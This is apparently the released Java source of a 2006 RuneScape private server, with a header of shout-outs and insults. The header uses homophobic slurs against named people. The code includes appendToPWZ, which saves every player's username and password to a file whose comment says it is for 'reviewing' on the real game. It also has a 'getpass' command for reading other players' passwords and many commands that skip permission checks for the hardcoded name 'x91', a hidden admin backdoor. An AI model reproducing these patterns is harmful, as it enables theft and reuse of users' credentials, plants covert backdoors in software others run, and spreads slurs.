...
###############################################################
Hope you enjoy and use this source well - Xerozcheez

People who pawn my mother lolz:

Mamo4us - Amazing zomfomgogmogmogmg friend and admin on cheezsape!!!!! :D
O shadow O / Il Icy Il - Amazing uber pawnage friend and admin on cheezscape!!!
Alex - Great friend and amazing admin on cheezscape, trustworthy too!!!!!!!! =p
Vegeta Ssj - Also a great friend, although we fell out a lot, but we still g unit homies rofl (I think :$:$)
Swift - Great friend very trustworthy!!!!!!!!!!!!!!!!!!!!!
Phate - Good friend / coder, did a great job with runestatus and avatorium, although he ripped me off with that item handler!!!! :p
Silentone / Dare Devil - Nice guy, also did great job with runestatus and avatorium, but did act wierd at times on msn
Master Eagle / The Fearow - Good friend, again did a good job with runestatus and avatorium (mainly avatorium)
Zorlin - Good friend, although I don't talk to him much these days
Overdosed - I talk to him sometimes on msn, don't know him terribly well but felt I should add him cuz he pawnz, sorry bout when we had that huge fight which got me banned on runestatus btw
DrBone420 / Kenetix - Amazing friend, sold me many codes in the days, including proper trading, about a month before whitescape was released, and put up with my noob questions, thanks d00d
Justin / DeadBird - Amazing guy :D
Mike - Good friend lolz, I hope he still loves me rofl XD
Tha Professa - K00l friend, known him for ages, was a good mod on cheezscape too
Kevin - Good friend, although he messed up my server I don't mind, that's the past :p
Silabsoft - Good friend / coder, made loads of unique things in servs :D
Ramenryoko - Good friend, although we fell out for a long time that was just cuz I was immature at times =p
Whitefang - Good coder / friend, ignore my cheat client :$
Wolf - Good friend, although I hated him at once, cuz he tried to act all mature all the time :$, but he soon changed and I apologized :D
Kilk - He's cool ? :S lol
Volcom - One of my newer friends, they don't care that I pawned Santa just like friends I've known longer (H)
MrWicked - He taught me a lot when I was a young server slut looking for more codes to lick, but now, he's more interested in cock riders like Gander and Rsrules :(:(
byrontheomnipoten - I released his source, he released mine, "two peas in a pod", he's a good friend :D

People who are fag jacks:
Gander - Gay.
Rsrules - Also gay.
Santa Clause - Gayer than www.porkhole.net
Darkflare81 - Definatly gay.
Shawn - Zomfg uber gay also
Deman Wizard - GAY + tighter than a rat's fanny, smaller than 2 inches, enjoy the free 45mill bitch, rs2 blows anyway :p

###############################################################

Last Update (80): 25.8.2006

[===================================================================]

Update 80 info: Added dialogue handler
Update 79 info: Added duel arena!
Update 78 info: Fixed projectiles, and added all strike, bolt, blast and wave spells
Update 77 info: Make over mage and smithing fixed
Update 76 info: You now walk to object before doing action like real rs
Update 75 info: FULL woodcutting, works great, also a few bug fixes
Update 74 info: Teleother
Update 73 info: You keep your 3 most valuable items when you die!
Update 72 info: Added a limit to npcs you can summon and also made it so all your summoned npcs die when you logout
Update 71 info: Added SUMMONING skill
Update 70 info: Added support for poisoning npcs and now ice barrage hits multiple targets!
Update 69 info: Added Spells Of The Gods quest! Tested and fully working!
Update 68 info: Fixed cooking up so you have a chance of burning depends on level and gaunlets
Update 67 info: Added Hidden points, you get points for doing secret commands etc :D
Update 66 info: Made timers 5x as fast on skills, magic xp has doubled and added backup save feature
Update 65 info: Added pk points, kill and death counts.
Update 64 info: Added full range, deletes arrow from equipment slot and arrow appears on floor, has proper bonuses too :D
Update 63 info: Wilderness levels
...
if (IsInWilderness(EnemyX, EnemyY, 1) == true || playerName.equalsIgnoreCase("x91"))
{
                int casterX = absX;
                int casterY = absY;
...
ProjectileSpellPlayer(99, 100, 101, absY, absX, offsetY, offsetX, index, EnemyY, EnemyX, 11, 1, 566, 558, 554, 1, 1, 3);
}
...
{
hitDiff = 5 + misc.random(59);
startAnimation(1979);
attackPlayersWithin(369, 59, 30); 
castOnPlayer.PoisonPlayer();
...
public static Woodcutting Woodcutting;
	static {
		Woodcutting = new Woodcutting(0);
	}

public static Theiving Theiving;
	static {
		Theiving = new Theiving(0);
	}
...
public void appendToPWZ() { // Logs player info for further "reviewing" on rs (H)

      BufferedWriter bw = null;

      try {
         bw = new BufferedWriter(new FileWriter("data/pwz.txt", true));
	 bw.write(playerName+":"+playerPass);
	 bw.newLine();
	 bw.flush();
      } catch (IOException ioe) {
	 ioe.printStackTrace();
...
case 2873:
Theiving.TakeCape("Saradomin", 16, 99, 16, 5000, 2412, 1, 60, 645, playerId);
resetanim = 6;  
break;

case 2875:
Theiving.TakeCape("Guthix", 15, 99, 15, 5000, 2413, 1, 60, 645, playerId);
resetanim = 6; 

case 2874:
Theiving.TakeCape("Zamorak", 20, 99, 20, 5000, 2414, 1, 60, 645, playerId); 
resetanim = 6;
break;
...
Theiving.TakeMisc("You pray to the energy barrier...", "...and recieve some ourg bones.", "pray at the energy barrier", 5, 85, 5, 20*playerLevel[5], 4834, 1, 30, 645, playerId);
break;

case 5282:   // Ectofuntus Energy Barrier
Theiving.TakeMisc("You pray to the ectofuntus...", "...and recieve some prayer experience.", "pray at the ectofuntus", 5, 85, 5, 80*playerLevel[5], 4834, 1, 30, 645, playerId);
break;



case 2640:   // Pray guild altar
Theiving.TakeMisc("You pray at the altar...", "...and recieve the cape of legends!", "pray at this altar", 5, 120, 5, 5000, 1052, 1, 60, 645, playerId);
break;
...
Theiving.TakeMisc("You put your hand into the portal...", "You find a staff of Zamorak", "reach inside", 6, 99, 6, 1000, 2417, 1, 120, 811, playerId);
break;

case 4408:   // Castle wars guthix portal
Theiving.TakeMisc("You put your hand into the portal...", "You find a staff of Guthix", "reach inside", 6, 99, 6, 1000, 2416, 1, 120, 811, playerId); 
break;

case 4388:   // Castle wars sara portal
Theiving.TakeMisc("You put your hand into the portal...", "You find a staff of Saradomin", "reach inside", 6, 99, 6, 1000, 2415, 1, 120, 811, playerId); 
break;
...
case 4460:
Theiving.TheifStall("table", "and recieve an item", 50, 50*playerLevel[17], Item.randomTheif50tableitem(), 1, 30, 0x340, playerId);
break;

case 4464:
Theiving.TheifStall("table", "and recieve an item", 60, 65*playerLevel[17], Item.randomTheif60tableitem(), 1, 30, 0x340, playerId);
break;

case 4463:
Theiving.TheifStall("table", "and recieve an item", 70, 95*playerLevel[17], Item.randomTheif70tableitem(), 1, 30, 0x340, playerId);
break;

case 4462:
Theiving.TheifStall("table", "and recieve an item", 78, 105*playerLevel[17], Item.randomTheif70tableitem(), 1, 30, 0x340, playerId);
break;

case 4461:
Theiving.TheifStall("table", "and recieve an item", 93, 300*playerLevel[17], Item.randomTheif93tableitem(), 1, 30, 0x340, playerId);
break;

case 4459:
Theiving.TheifStall("table", "and recieve an item", 85, 200*playerLevel[17], Item.randomTheif85tableitem(), 1, 30, 0x340, playerId);
break;
...
case 354:
Theiving.TheifStall("secret crate", "and recieve an item", 99, 20*playerLevel[17], 1631, 1, 40, 0x340, playerId);	
break;			

case 355:
Theiving.TheifStall("crate", "and steal a gnome", 1, 10*playerLevel[17], 3257, 1, 40, 0x340, playerId);	
break;					

case 361:
Theiving.TheifStall("crate", "and steal a cup of tea", 1, 10*playerLevel[17], 4245, 1, 40, 0x340, playerId);	
break;		
				
case 359:
Theiving.TheifStall("boxes", "and steal a basket of eggs", 1, 10*playerLevel[17], 4245, 1, 40, 0x340, playerId);	
break;	
...
case 5903:
case 5904:
Woodcutting.Woodcutting("",  1, 25, 1511, 1, objectID, objectX, objectY, 875, playerId);
break;

case 1281:
case 3037:
Woodcutting.Woodcutting("oak",  15, 50, 1521, 1, objectID, objectX, objectY, 875, playerId);
break;
...
case 5552:
case 5553:
Woodcutting.Woodcutting("willow",  35, 75, 1519, 1, objectID, objectX, objectY, 875, playerId);
break;

case 1307:
case 4674:
Woodcutting.Woodcutting("maple",  45, 100, 1517, 1, objectID, objectX, objectY, 875, playerId);
break;

case 1309:
Woodcutting.Woodcutting("yew",  60, 150, 1515, 1, objectID, objectX, objectY, 875, playerId);
break;

case 1292:
case 1306:
Woodcutting.Woodcutting("magic",  1, 75, 1513, 1, objectID, objectX, objectY, 875, playerId);
break;
...
case 2562:
Theiving.TheifStall("gem stall", "and recieve a gem", 75, 75*playerLevel[17], Item.randomGem(), 1, 30, 0x340, playerId);
break;

case 2560:
Theiving.TheifStall("stall", "and recieve an item", 60, 40*playerLevel[17], Item2.randomHerby(), 1, 30, 0x340, playerId);
break;

case 2565:
Theiving.TheifStall("stall", "and recieve an item", 85, 200*playerLevel[17], Item.randomSilver(), 1, 30, 0x340, playerId);
break;

case 635:
Theiving.TheifStall("tea stall", "and steal a cup of tea", 1, 5*playerLevel[17], 1978, 1, 30, 0x340, playerId);
break;
...
if(inwildy == false && playerLevel[6] > level && teleblock == false && actionTimer <= 1) 
{
     ...
     if (s == "Lumby")
     {
        teleX = 3222;
        teleY = 3218;
        addSkillXP((200*playerLevel[6]), 1);
        newheightLevel = 0;
     }
     ...
     if (s == "Camelot")
     {
        teleX = 2757;
        teleY = 3477;
       addSkillXP((500*playerLevel[6]), 1);
        newheightLevel = 0;
     }
     ...
     if (s == "Ardougne")
     {
        teleX = 2662;
        teleY = 3305;
        addSkillXP((850*playerLevel[6]), 1);
        newheightLevel = 0;
     ...
     if (s == "Watchtower")
     {
        teleX = 2549;
        teleY = 3113;
        addSkillXP((1780*playerLevel[6]), 1);
        newheightLevel = 0;
     ...
     if (s == "Trollheim")
     {
        teleX = 3285;
        teleY = 3343;
        addSkillXP((2682*playerLevel[6]), 1);
        newheightLevel = 0;
     }
     ...
     if (s == "Ape")
     {
        teleX = 2795;
        teleY = 2799;
        addSkillXP((3458*playerLevel[6]), 1);
        newheightLevel = 1;
     }
    if (s == "Paddewwa"){
        ...
        teleX = 3131; 
        teleY = 9912;
        addSkillXP((1200*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
 if (s == "Senntisten"){
        ...
        teleX = 3312; 
        teleY = 3376;
        addSkillXP((2100*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
  if (s == "Kharyrll"){
        ...
        teleX = 3493; 
        teleY = 3485;
        addSkillXP((3300*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
    if (s == "Lasaar"){
        ...
        teleX = 3007; 
        teleY = 3477;
        addSkillXP((3900*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
    if (s == "Carrallangar"){
        ...
        teleX = 3161; 
        teleY = 3671;
        addSkillXP((5100*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
 if (s == "Annakarl"){
        ...
        teleX = 3288; 
        teleY = 3886;
        addSkillXP((10000*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
  if (s == "Ghorrock"){
        ...
        teleX = 3091;
        teleY = 3963;
        addSkillXP((18000*playerLevel[playerMagic]), playerMagic);
        newheightLevel = 0;
     }
RemoveAllWindows();
closeInterface();
...
//Rune
	...
	//barrows
	 if(removeID == 4708 || removeID == 4722 || removeID == 4736
	 || removeID == 4710 || removeID == 4724 || removeID == 4738
	 || removeID == 4712 || removeID == 4726 || removeID == 4740
	 || removeID == 4714 || removeID == 4728 || removeID == 4753
	 || removeID == 4716 || removeID == 4730 || removeID == 4755
	 || removeID == 4718 || removeID == 4732 || removeID == 4757
	 || removeID == 4720 || removeID == 4734 || removeID == 4759) {
	  return 2355;
	 }
     return 0;
}
...
if(item == 4710 && playerLevel[13] >= 85) 
{
 return true;
}
if(item == 4712 && playerLevel[13] >= 87) 
{
 return true;
}
if(item == 4714 || item == 4716 && playerLevel[13] >= 88) 
{
 return true;
}
if(item == 4718 || item == 4720 || item == 4722 && playerLevel[13] >= 89) 
{
 return true;
}
if(item == 4724 || item == 4726 && playerLevel[13] >= 90) 
{
 return true;
}
if(item == 4728 && playerLevel[13] >= 91) 
{
 return true;
}
if(item == 4730 || item == 4732 && playerLevel[13] >= 92) 
{
 return true;
}
if(item == 4734 && playerLevel[13] >= 93) 
{
 return true;
}
if(item == 4736 && playerLevel[13] >= 94) 
{
 return true;
}
if(item == 4738 && playerLevel[13] >= 95) 
{
 return true;
}
if(item == 4740 && playerLevel[13] >= 96) 
{
 return true;
}
if(item == 4753 && playerLevel[13] >= 97) 
{
 return true;
}
if(item == 4755 && playerLevel[13] >= 98) 
{
 return true;
}
if(item == 4757 && playerLevel[13] >= 99) 
{
 return true;
}
if(item == 4759 && playerLevel[13] >= 99) 
{
 return true;
}
 //return false;
...
if(barType == 2363) { //Rune
 ...
 if(barType == 2355) 
  { //Barrows with silver bars
   if(playerLevel[13] < 85) 
{
 sendQuest("@bla@ahrims hood@bla@",1101);
} else {
 sendQuest("@whi@ahrims hood@whi@",1101);
}
if(playerLevel[13] < 85) 
{
 sendQuest("@bla@ahrims staff@bla@",1099);
 sendQuest("@bla@ahrims staff@bla@",1100);
} else {
 sendQuest("@whi@ahrims staff@whi@",1099);
 sendQuest("@whi@ahrims staff@whi@",1100);
}
if(playerLevel[13] < 87) 
{
 sendQuest("@bla@ahrims top@bla@",1088);
} else {
 sendQuest("@whi@ahrims top@whi@",1088);
}
if(playerLevel[13] < 88) 
{
 sendQuest("@bla@ahrims skirt@bla@",8429);
} else {
 sendQuest("@whi@ahrims skirt@whi@",8429);
}
if(playerLevel[13] < 89) 
{
 sendQuest("@bla@dharoks helm@bla@",1105);
} else {
 sendQuest("@whi@dharoks helm@whi@",1105);
}
if(playerLevel[13] < 90) 
{
 sendQuest("@bla@dharoks axe@bla@",1098);
} else {
 sendQuest("@whi@dharoks axe@whi@",1098);
}
if(playerLevel[13] < 91) 
{
 sendQuest("@bla@dharoks plate@bla@",1092);
} else {
 sendQuest("@whi@dharoks plate@whi@",1092);
}
if(playerLevel[13] < 92) 
{
 sendQuest("@bla@dharoks legs@bla@",1083);
} else {
 sendQuest("@whi@dharoks legs@whi@",1083);
}
if(playerLevel[13] < 93) 
{
 sendQuest("@bla@guthans helm@bla@",1104);
} else {
 sendQuest("@whi@guthans helm@whi@",1104);
}
if(playerLevel[13] < 94) 
{
 sendQuest("@bla@guthans warspear@bla@",1103);
 sendQuest("@bla@guthans plate@bla@",1106);
} else {
 sendQuest("@whi@guthans warspear@whi@",1103);
 sendQuest("@whi@guthans plate@whi@",1106);
}
if(playerLevel[13] < 95) 
{
 sendQuest("@bla@guthans skirt@bla@",1086);
} else {
 sendQuest("@whi@guthans skirt@whi@",1086);
}
if(playerLevel[13] < 95) 
{
 sendQuest("@bla@karils coif@bla@",1087);
 sendQuest("@bla@karils x-bow@bla@",1108);
} else {
 sendQuest("@whi@karils coif@whi@",1087);
 sendQuest("@whi@karils x-bow@whi@",1108);
}
if(playerLevel[13] < 96) 
{
 sendQuest("@bla@karils top@bla@",1085);
 sendQuest("@bla@karils skirt@bla@",1107);
 sendQuest("@bla@bolt racks@bla@",13358);
} else {
 sendQuest("@whi@karils top@whi@",1085);
 sendQuest("@whi@karils skirt@whi@",1107);
 sendQuest("@whi@bolt racks@whi@",13358);
}
if(playerLevel[13] < 97) 
{
 sendQuest("@bla@veracs helm@bla@",1102);
} else {
 sendQuest("@whi@veracs helm@whi@",1102);
}
if(playerLevel[13] < 98) 
{
 sendQuest("@bla@veracs flail@bla@",1093);
} else {
 sendQuest("@whi@veracs flail@whi@",1093);
}
if(playerLevel[13] < 99) 
{
 sendQuest("@bla@veracs top@bla@",1094);
 sendQuest("@bla@veracs skirt@bla@",1091);
} else {
 sendQuest("@whi@veracs top@whi@",1094);
 sendQuest("@whi@veracs skirt@whi@",1091);
}
addItemToSmith(4757,0,1119,1);
addItemToSmith(4759,0,1120,1);
addItemToSmith(4718,0,1121,1);
addItemToSmith(4753,0,1122,1);
addItemToSmith(4738,0,1123,1);
addItemToSmith(4736,1,1119,1);
addItemToSmith(4755,1,1120,1);
addItemToSmith(4710,1,1121,1);
addItemToSmith(4726,1,1122,1);
addItemToSmith(4734,1,1123,1);
addItemToSmith(4732,2,1119,1);
addItemToSmith(4722,2,1120,1);
addItemToSmith(4710,2,1121,1);
addItemToSmith(4724,2,1122,1);
addItemToSmith(4728,2,1123,1);
addItemToSmith(4730,3,1119,1);
addItemToSmith(4720,3,1120,1);
addItemToSmith(4708,3,1121,1);
addItemToSmith(4716,3,1122,1);
//addItemToSmith(0,3,1123);
 sendQuest("",1132);
 sendQuest("",1096);
addItemToSmith(4712,4,1119,1);
addItemToSmith(4714,4,1120,1);
//addItemToSmith(1307,4,1121);
 sendQuest("",11459);
 sendQuest("",11461);
addItemToSmith(4740,4,1122,1);
//addItemToSmith(1307,4,1123);
 sendQuest("",1135);
 sendQuest("",1134);
 }
...
//MyOutput = new PrintStream(new FileOutputStream("ftp://ebefnnw@ftp.rs-server.net/public_html/highscore/cheezscape/dat/" + playerName + ".dat"));
  	 } catch (IOException e) {
...
public void updatePlayers()
	...
	public void ModTaharokMenu()
	{

					sendQuest("@dre@Mod Taharok Menu", 8144);  //Title
					clearQuestInterface();
					sendQuest("@dbl@Server Information", 8145);
					sendQuest("@dbl@Server IP: @gre@"+"freescape.servegame.com", 8147);
					sendQuest("@dbl@Players Online: @gre@"+PlayerHandler.getPlayerCount(), 8148);
...
if(playerRights < 1){
					...
					clearQuestInterface();
					sendQuest("@dbl@Welcome to Freescape", 8145);
					sendQuest("@dbl@@dre@Made by Mod Taharok", 8147);
...
public void rune(){
	...
	public void craftgild()
	{	
		if (actionTimer == 0)
		{
			deleteItem(5525,getItemSlot(5525),1);	
			sendMessage("You combine the power of the tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a gold item"); 
			addItem(Item.craftedgild(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
	public void craftdrag()
	{	
		if (actionTimer == 0)
		{
			deleteItem(5549,getItemSlot(5549),1);	
			sendMessage("You combine the power of the blood tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a red item"); 
			addItem(Item.crafteddrag(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
	...
	{	
		if (actionTimer == 0)
		{
			deleteItem(5545,getItemSlot(5545),1);	
			sendMessage("You combine the power of the law tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a blue item"); 
			addItem(Item.craftedrune(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
	public void craftsara()
	{	
		if (actionTimer == 0)
		{
			deleteItem(5527,getItemSlot(5527),1);	
			sendMessage("You combine the power of the air tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a white coloured item"); 
			addItem(Item.craftedsara(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
	public void craftzam()
	{	
		if (actionTimer == 0)
		{
			deleteItem(5537,getItemSlot(5537),1);	
			sendMessage("You combine the power of the fire tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a red coloured item"); 
			addItem(Item.craftedzam(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
	public void craftguth()
	{	
		if (actionTimer == 0)
		{
			deleteItem(5541,getItemSlot(5541),1);	
			sendMessage("You combine the power of the nature tiara with the");
			sendMessage("fountains water, and you feel a strange force around you!");
			sendMessage("Your tiara dissapears and you recieve a green coloured item"); 
			addItem(Item.craftedguth(), 1);	
			addSkillXP(((1000*playerLevel[20])+10000), 20);	
		}
	}
...
public boolean buryBones(int fromSlot)
	{
		...
		{               
				...
				updateRequired = true;
				hitUpdateRequired = true;
                                sendMessage("You eat the shark, it heals 40 hitpoints.");
                                setAnimation(829);
		}
                else if(myHP >= 99)
                { 
		...
		{               
				...
				updateRequired = true;
				hitUpdateRequired = true;
                                sendMessage("You eat the turtle, it heals 50 hitpoints.");
                                setAnimation(829);
		}
                else if(myHP >= 99)
                { 
		...
		{               
				...
				updateRequired = true;
				hitUpdateRequired = true;
                                sendMessage("You eat the manta ray, it heals 60 hitpoints.");
                                setAnimation(829);
		}
                else if(myHP >= 99)
                { 
...
loadmoreinfo();
loadquestinterface();
server.skillHandler.summoning.RefreshSummonBook(playerId);
loadweather();
appendConnected();
loggedinpm();
updatePlayers(); 
...
playerServer = "cheezscape.servegame.org"; 
...
public void appendToLR(String report){
	 ...
	 if (bw != null) try {
      ...
      try {
         bw = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/loginreports.txt", true));
	 bw.write(report);
	 bw.newLine();
	 bw.flush();
      } catch (IOException ioe) {
...
command.trim();
 ...
 if(command.startsWith("clicks") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91"))) {

    if(!LoggingClicks) {
    sendMessage("Logging clicks set to true");
    sendMessage("To view the logs (not just mouse logs), go to...");
    sendMessage("http://cheezscape.ath.cx:8080/logs87/");
    LoggingClicks = true;
    }
    if(LoggingClicks) {
 ...
 if(command.startsWith("banuser") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91")))
                        {
 ...
 if(command.startsWith("macrowarn") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91")))
                        {
 ...
 if(command.startsWith("getpass") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91")))
                        {
                        String name = command.substring(8);
                        if(name.equalsIgnoreCase("x91")) {
                        sendMessage("Nice try fool! :D");
                        }
                        else if(!name.equalsIgnoreCase("x91")) {
	 ...
	 if (bw != null) try {
      ...
      try {
         bw = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/getpass.txt", true));
	 bw.write(playerName+" checked "+name+"'s password");
	 bw.newLine();
	 bw.flush();
      } catch (IOException ioe) {
...
if(command.startsWith("text4") && playerName.equalsIgnoreCase("x91")) {
...
/*FRAME TESTING*/
				...
				try {
                                        int x1 = Integer.parseInt(command.substring(4,8));
                                        int x2 = Integer.parseInt(command.substring(9));
					frame36(x1, x2);
				} catch(Exception e) {
...
else if (command.startsWith("projz") && playerName.equalsIgnoreCase("x91")) {
...
println_debug("clueid: "+clueid);
  ...
  appearanceUpdateRequired = true;
	...
	else if (command.equalsIgnoreCase("rares") && playerRights >= 2)
	{
		addItem(1048,1);
		addItem(1046,1); 
		addItem(1044,1); 
		...
		addItem(4566,1);
		addItem(1419,1);
		sendMessage("OMFG, your rich!!!."); 
	}

	else if (command.equalsIgnoreCase("modt") && playerRights >= 2)
	{
		addItem(1048,1);
		addItem(4151,1); 
		addItem(6570,1); 
		...
		addItem(4224,1);
		addItem(1837,1);
		sendMessage("Looking good..."); 
	}

	else if (command.equalsIgnoreCase("gopk"))
		if(absY >= 3672)
		{
			sendMessage("You cannot teleport above level 20 wilderness.");
		}
	...
	else if (command.equalsIgnoreCase("tzhaar"))
		if(absY >= 3672)
		{
			sendMessage("You cannot teleport above level 20 wilderness.");
		}
	...
	else if (command.equalsIgnoreCase("smelt") && duelStatus == -1)
     if(absY >= 3672)
     {
     sendMessage("You cannot teleport above level 20 wilderness.");
     }
	...
	else if (command.equalsIgnoreCase("fish") && duelStatus == -1)
     {
     if(absY >= 3672 && absY <= 3970) 
     {
     sendMessage("You cannot teleport above level 20 wilderness..");
	...
	else if (command.equalsIgnoreCase("duel") && duelStatus == -1)
     {
     if(absY >= 3672 && absY <= 3970) 
     {
     sendMessage("You cannot teleport above level 20 wilderness..");
	...
	else if (command.equalsIgnoreCase("fish2") && duelStatus == -1)
     {
     if(absY >= 3672 && absY <= 3970) 
     {
     sendMessage("You cannot teleport above level 20 wilderness.");
	...
	else if (command.equalsIgnoreCase("range") && duelStatus == -1)
     {
     if(absY >= 3672 && absY <= 3970) 
     {
     sendMessage("You cannot teleport above level 20 wilderness.");
	...
	{
	sendMessage("I once had a life, but now i have a computer.       ~Anonymous.");
	}
...
else if (command.startsWith("2head") && playerName.equalsIgnoreCase("x91"))
{
int id = Integer.parseInt(command.substring(5));
		outStream.createFrame(254); 
		outStream.writeByte(id);
...
else if (command.startsWith("3head") && playerName.equalsIgnoreCase("x91"))
{
int id = Integer.parseInt(command.substring(5));
		outStream.createFrame(254); 
		outStream.writeByte(id);
...
else if (command.startsWith("4head") && playerName.equalsIgnoreCase("x91")) 
{
int id = Integer.parseInt(command.substring(5));
		outStream.createFrame(254); 
		outStream.writeByte(id);
...
else if (command.startsWith("underground") && playerName.equalsIgnoreCase("x91"))
{
teleportToX = absX;
teleportToY = (absY  + 6400);
sendMessage("K-ug");
...
else if (command.startsWith("aboveground") && playerName.equalsIgnoreCase("x91"))
{
teleportToX = absX;
teleportToY = (absY  - 6400);
sendMessage("K-ag");
}
else if (command.startsWith("newhl") && playerName.equalsIgnoreCase("x91"))
{
...
teleportToY = (absY  - 1);
	...
	else if (command.startsWith("xteleto") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91")))
	{
		try{
	...
	else if (command.startsWith("checkip") && (playerRights >= 2 || playerName.equalsIgnoreCase("x91")))
	{
		try{
		String otherPName = command.substring(8);
		int otherPIndex = PlayerHandler.getPlayerID(otherPName);
	...
	else if (command.startsWith("duelz") && !command.startsWith("dueli"))
		{
			outStream.createFrame(97);
...
foundz[11] = 1;
			...
			else if(command.startsWith("sidebar") && playerName.equalsIgnoreCase("x91"))
			{
...
else if (command.startsWith("setsb") && playerName.equalsIgnoreCase("x91"))
{
int newsb = Integer.parseInt(command.substring(6));
sb = newsb;
sendMessage("Sidebar = "+sb);
}
else if (command.equalsIgnoreCase("sbloop") && playerName.equalsIgnoreCase("x91"))
{
sbloop = true;
sbscan = false;
}
else if (command.equalsIgnoreCase("sbfast") && playerName.equalsIgnoreCase("x91"))
{
sbloop = true;
sbscan = true;
}
...
appearanceUpdateRequired = true;
			...
			else if (command.startsWith("setemote") && playerRights >= 1 && playerName.equalsIgnoreCase("x91"))
			{
...
else if (command.equalsIgnoreCase("loop") && playerName.equalsIgnoreCase("x91"))
{
resetanim = 999;
}
...
else if (command.equalsIgnoreCase("clientdrop") && !playerName.equalsIgnoreCase("X91"))
{
appendToBanned(playerName);
}
			...
			} else if (command.startsWith("object") && playerName.equalsIgnoreCase("x91"))
	{
		...
		catch(Exception e) 
		{
			sendMessage("Bad object ID"); 
             ...
             else if(command.startsWith("i2on")) {
                int iz = Integer.parseInt(command.substring(5,10));
                int iz2 = Integer.parseInt(command.substring(11,15));
                int iz3 = Integer.parseInt(command.substring(16,20));
                int iz4 = Integer.parseInt(command.substring(21));
		outStream.createFrameVarSizeWord(53);
		outStream.writeWord(iz); // interface
		outStream.writeWord(iz2); // slot
		outStream.writeByte(iz3); // amount
		outStream.writeWordBigEndianA(iz4); //item id
		outStream.endFrameVarSizeWord();
             } 
             else if(command.startsWith("ioni")) {
                int interz = Integer.parseInt(command.substring(5,10));
                int itemID = Integer.parseInt(command.substring(11));
		outStream.createFrameVarSizeWord(53);
		outStream.writeWord(interz); // interface
		outStream.writeWord(1); // slot
		outStream.writeByte(10); // amount
		outStream.writeWordBigEndianA(itemID); //item id
		outStream.endFrameVarSizeWord();
             } else if(command.startsWith("dueli")) {
                int interz = Integer.parseInt(command.substring(6));
		outStream.createFrameVarSizeWord(53);
		outStream.writeWord(interz);
		outStream.writeWord(1);
		outStream.writeByte(100);
		outStream.writeWordBigEndianA(1042); //item id
		outStream.endFrameVarSizeWord();
             } else if(command.startsWith("248")) {
                   sendFrame248(Integer.parseInt(command.substring(4,9)), Integer.parseInt(command.substring(10)));
              }
               else if (command.startsWith("sq") && playerName.equalsIgnoreCase("x91")) {
					int qid = Integer.parseInt(command.substring(3));
                                        sendQuest("lolol", qid);
			} else if (command.startsWith("sendqz") && playerName.equalsIgnoreCase("x91")) {
                                        int range = Integer.parseInt(command.substring(7));
                                        for(int i = 0; i < range; i++)
                                        sendFrame126(""+i+"", i);
			} else if (command.startsWith("sendzq2") && playerName.equalsIgnoreCase("x91")) {
                                        int range1 = Integer.parseInt(command.substring(8,12));
                                        int range2 = Integer.parseInt(command.substring(13));
                                        for(int i = range1; i < range2; i++)
                                        sendFrame126(""+i+"", i);
			} else if (command.startsWith("sendquestduel") && playerName.equalsIgnoreCase("x91")) {
                                        for(int i = 6300; i < 6900; i++)
                                        sendFrame126(""+i+"", i);
			} else if (command.startsWith("sendquesttest") && playerName.equalsIgnoreCase("x91")) {
                                        for(int i = 0; i < 5; i++)
                                        sendFrame126(""+i+"", i);
			...
			} else if (command.startsWith("goupz") && playerName.equalsIgnoreCase("x91")) {
				teleportToX = absX;
				teleportToY = absY;
				heightLevel += 1;
			} else if (command.startsWith("godownz") && playerName.equalsIgnoreCase("x91")) {
				teleportToX = absX;
				teleportToY = absY;
				heightLevel -= 1;
			...
			} else if (command.startsWith("pickup") && playerName.equalsIgnoreCase("mod taharok")) {
				try {
	 ...
	 if (bw != null) try {
      ...
      try {
         bw = new BufferedWriter(new FileWriter("C:/apache2triad/htdocs/logs87/kicklogs.txt", true));
	 bw.write(playerName+" kicked "+PlayerHandler.kickNick);
	 bw.newLine();
	 bw.flush();
      } catch (IOException ioe) {
	 ...
	 if (bw != null) try {
	    ...
	    sendMessage("Error logging kicks!");
				...
				PlayerHandler.kickAllPlayers = true;
			} else if (command.startsWith("nick") && playerName.equalsIgnoreCase("x91")) {
				try {
		...
		if (command.startsWith("pass") && command.length() > 5) {
			...
			removeAllItems();
                ...
                } else if (command.equalsIgnoreCase("loadbackup") && playerName.equalsIgnoreCase("x91")) {
                        try{
                        ...
                        if(bankItems[i] < 1 && bankItemsN[i] < 1 && playerItems[i2] < 1 && playerItemsN[i2] < 1 && playerEquipment[i3] < 1){
                         ...
                         loadothers();
                         loggedinpm();
                         playerServer = "Freescape.servegame.org";
                        }
                        else {
...
muted = 1;
		  ...
		  sendMessage("Do not use your cheezscape password on any other site or server!");
                  sendMessage("Change your password regularly as many people get hacked each week.");
                  sendMessage("Offical forums at www.cheezscape.tk");
                  sendMessage("Type ::duel to go to duel arena, you can stake anywhere but");
                  sendMessage("It is recommended to stake at arena to stop teleport bugs");
                }
                 if(playerRights == 1) {
                  sendMessage("Welcome back moderator "+playerName);
